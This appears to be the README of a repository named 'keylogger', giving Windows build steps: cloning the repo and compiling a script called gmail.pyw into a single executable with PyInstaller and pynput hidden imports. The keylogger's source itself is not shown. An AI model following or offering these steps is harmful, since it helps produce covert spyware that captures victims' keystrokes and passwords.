# keylogger

# Compiled in WINDOWS

    git clone https://github.com/clhore/keylogger.git
    cd keylogger
    pyinstaller --onefile --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 .\gmail.pyw
